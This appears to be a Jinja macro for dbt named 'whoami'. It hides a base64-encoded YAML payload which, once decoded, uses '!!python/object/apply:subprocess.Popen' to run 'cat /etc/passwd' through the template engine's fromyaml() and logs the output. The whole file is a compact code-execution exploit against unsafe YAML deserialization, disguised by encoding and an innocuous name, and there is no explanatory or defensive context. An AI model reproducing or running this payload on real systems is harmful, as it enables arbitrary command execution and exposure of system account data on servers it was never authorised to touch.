{% macro whoami() %}

{% set yaml_str -%}

ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gY2F0CiAgLSAvZXRjL3Bhc3N3ZAo=

{%- endset %}
{% set my_dict = fromyaml(yaml_str)  %}
{% do log(my_dict, info=true) %}
{% endmacro %}